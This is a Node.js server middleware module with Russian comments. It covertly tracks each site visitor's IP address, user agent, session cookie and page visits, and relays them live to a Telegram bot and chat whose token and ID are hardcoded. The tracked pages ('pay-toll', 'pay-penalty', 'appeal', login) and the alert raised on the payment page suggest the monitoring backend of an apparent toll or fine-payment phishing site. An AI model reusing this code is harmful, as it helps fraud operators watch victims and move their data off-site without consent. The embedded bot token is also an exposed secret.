/**
 * Telegram Logger - серверное отслеживание действий пользователей
 * Одна сессия = одно редактируемое сообщение
 * 
 * НОВЫЙ ПОДХОД: Логирование на уровне сервера (не клиентский скрипт)
 */

const https = require('https');
const logger = require('./logger');

// Telegram Bot Configuration
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8368526952:AAGDK9Q3KfOVNltB0uvUihs0-9DzN8StWDo';
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-5166820954';

// Store session data: sessionId -> { messageId, logs: [], ip, userAgent, startTime }
const sessions = new Map();

// Clean old sessions after 30 minutes
const SESSION_TIMEOUT = 30 * 60 * 1000;

setInterval(() => {
  const now = Date.now();
  for (const [sessionId, session] of sessions) {
    if (now - session.startTime > SESSION_TIMEOUT) {
      sessions.delete(sessionId);
    }
  }
}, 60 * 1000);

/**
 * Send message to Telegram
 */
async function sendTelegramMessage(text, parseMode = 'HTML') {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify({
      chat_id: CHAT_ID,
      text: text,
      parse_mode: parseMode,
      disable_web_page_preview: true,
    });

    const options = {
      hostname: 'api.telegram.org',
      port: 443,
      path: `/bot${BOT_TOKEN}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(data),
      },
    };

    const req = https.request(options, (res) => {
      let body = '';
      res.on('data', (chunk) => body += chunk);
      res.on('end', () => {
        try {
          const result = JSON.parse(body);
          if (result.ok) {
            resolve(result.result);
          } else {
            logger.error('[TG] Send error:', result.description);
            reject(new Error(result.description));
          }
        } catch (e) {
          reject(e);
        }
      });
    });

    req.on('error', (err) => {
      logger.error('[TG] Request error:', err.message);
      reject(err);
    });
    req.write(data);
    req.end();
  });
}

/**
 * Edit existing message in Telegram
 */
async function editTelegramMessage(messageId, text, parseMode = 'HTML') {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify({
      chat_id: CHAT_ID,
      message_id: messageId,
      text: text,
      parse_mode: parseMode,
      disable_web_page_preview: true,
    });

    const options = {
      hostname: 'api.telegram.org',
      port: 443,
      path: `/bot${BOT_TOKEN}/editMessageText`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(data),
      },
    };

    const req = https.request(options, (res) => {
      let body = '';
      res.on('data', (chunk) => body += chunk);
      res.on('end', () => {
        try {
          const result = JSON.parse(body);
          if (result.ok) {
            resolve(result.result);
          } else {
            if (result.description && result.description.includes('message is not modified')) {
              resolve(null);
            } else {
              reject(new Error(result.description));
            }
          }
        } catch (e) {
          reject(e);
        }
      });
    });

    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

/**
 * Get page name in Russian
 */
function getPageNameRu(path) {
  if (!path || path === '/' || path === '') return 'Главная';
  
  const cleanPath = path.split('?')[0].replace(/^\//, '').replace(/\/$/, '');
  
  const translations = {
    'pay-toll': 'Оплата штрафа',
    'pay-penalty': 'Оплата штрафа',
    'user/login': 'Вход в аккаунт',
    'user/register': 'Регистрация',
    'login': 'Вход',
    'register': 'Регистрация',
    'account': 'Личный кабинет',
    'contact': 'Контакты',
    'about': 'О нас',
    'help': 'Помощь',
    'faq': 'FAQ',
    'appeal': 'Апелляция',
  };
  
  // Check for exact match first
  if (translations[cleanPath]) {
    return translations[cleanPath];
  }
  
  // Check for partial match
  for (const [key, value] of Object.entries(translations)) {
    if (cleanPath.includes(key)) {
      return value;
    }
  }
  
  return cleanPath.charAt(0).toUpperCase() + cleanPath.slice(1);
}

/**
 * Generate session ID from request
 */
function getSessionId(req) {
  // Use cookie if available
  const cookies = req.headers.cookie || '';
  const sessionMatch = cookies.match(/SESS[a-f0-9]+=[a-zA-Z0-9%_-]+/);
  
  if (sessionMatch) {
    return 'drupal_' + sessionMatch[0].substring(0, 20);
  }
  
  // Fallback: IP + User-Agent hash
  const ip = req.ip || req.socket?.remoteAddress || 'unknown';
  const ua = (req.headers['user-agent'] || 'unknown').substring(0, 50);
  const hash = Buffer.from(ip + ua).toString('base64').substring(0, 12);
  return 'ip_' + hash;
}

/**
 * Format session message for Telegram
 */
function formatSessionMessage(session, sessionId) {
  const shortId = sessionId.substring(0, 15).toUpperCase();
  
  let message = `🔗 <b>Client</b> [<code>${shortId}</code>]\n`;
  message += `📱 <code>${(session.userAgent || 'Unknown').substring(0, 80)}</code>\n`;
  message += `🌍 IP: <code>${session.ip || 'Unknown'}</code>\n\n`;
  
  // Add logs
  session.logs.forEach((log, index) => {
    const time = new Date(log.time).toLocaleTimeString('ru-RU', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
    
    switch (log.type) {
      case 'page_view':
        message += `📍 [${time}] Находится на: <b>${log.page}</b>\n`;
        break;
      case 'navigation':
        message += `↪️ [${time}] Перешёл на: <b>${log.page}</b>\n`;
        break;
      case 'form_submit':
        message += `📤 [${time}] Отправил форму на: <b>${log.page}</b>\n`;
        break;
      case 'payment_page':
        message += `💳 [${time}] <b>СТРАНИЦА ОПЛАТЫ!</b>\n`;
        break;
      case 'login_page':
        message += `🔐 [${time}] Страница входа\n`;
        break;
      default:
        message += `• [${time}] ${log.message || log.type}\n`;
    }
  });
  
  return message;
}

/**
 * Track page request (called from server middleware)
 */
async function trackPageRequest(req) {
  try {
    // Skip static files and assets
    const path = req.url || req.path || '/';
    if (path.match(/\.(js|css|png|jpg|jpeg|gif|ico|svg|woff|woff2|ttf|eot|map)(\?|$)/i)) {
      return;
    }
    
    // Skip API and internal paths
    if (path.startsWith('/api/') || path.startsWith('/_')) {
      return;
    }
    
    const sessionId = getSessionId(req);
    const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0] || req.socket?.remoteAddress || 'Unknown';
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const method = req.method || 'GET';
    const pageName = getPageNameRu(path);
    
    let session = sessions.get(sessionId);
    
    // Create new session
    if (!session) {
      session = {
        messageId: null,
        logs: [],
        ip: ip,
        userAgent: userAgent,
        startTime: Date.now(),
        lastPage: null,
      };
      sessions.set(sessionId, session);
    }
    
    // Determine action type
    let actionType = 'page_view';
    
    if (session.lastPage && session.lastPage !== path) {
      actionType = 'navigation';
    }
    
    if (method === 'POST') {
      actionType = 'form_submit';
    }
    
    if (path.includes('pay-toll') || path.includes('pay-penalty') || path.includes('payment')) {
      actionType = 'payment_page';
    }
    
    if (path.includes('login') || path.includes('user/login')) {
      actionType = 'login_page';
    }
    
    // Avoid duplicate logs for same page
    const lastLog = session.logs[session.logs.length - 1];
    const isDuplicate = lastLog && 
      lastLog.type === actionType && 
      lastLog.page === pageName &&
      (Date.now() - lastLog.time) < 5000; // Within 5 seconds
    
    if (!isDuplicate) {
      session.logs.push({
        type: actionType,
        page: pageName,
        path: path,
        method: method,
        time: Date.now(),
      });
      
      // Limit logs
      if (session.logs.length > 15) {
        session.logs = session.logs.slice(-15);
      }
      
      session.lastPage = path;
      
      // Format and send/edit message
      const messageText = formatSessionMessage(session, sessionId);
      
      if (session.messageId) {
        await editTelegramMessage(session.messageId, messageText);
      } else {
        const result = await sendTelegramMessage(messageText);
        if (result && result.message_id) {
          session.messageId = result.message_id;
          logger.info(`[TG] New session ${sessionId}, message_id: ${result.message_id}`);
        }
      }
    }
    
  } catch (error) {
    logger.error('[TG] Track error:', error.message);
  }
}

/**
 * Express middleware for tracking
 */
function trackingMiddleware(req, res, next) {
  // Track asynchronously, don't block request
  trackPageRequest(req).catch(() => {});
  next();
}

module.exports = {
  trackPageRequest,
  trackingMiddleware,
  sendTelegramMessage,
  editTelegramMessage,
};
